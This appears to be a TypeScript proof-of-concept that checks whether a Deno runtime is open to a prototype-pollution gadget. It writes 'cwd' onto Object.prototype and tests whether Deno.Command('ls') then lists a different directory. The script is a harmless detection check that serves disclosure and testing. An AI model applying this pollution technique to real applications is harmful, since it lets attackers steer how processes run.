const decoder = new TextDecoder("utf-8");

function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

let unpolluted: string | null = null;
{
    const process = new Deno.Command("ls");
    const { stdout } = await process.output();
    unpolluted = decoder.decode(stdout);
}

let polluted: string | null = null;
{
    pollute("cwd", "/");
    const process = new Deno.Command("ls");
    const { stdout } = await process.output();
    polluted = decoder.decode(stdout);
}

if (unpolluted !== polluted) {
    console.log("Your Deno version is vulnerable to this gadget.");
} else {
    console.log("Your Deno version is NOT affected.");
}
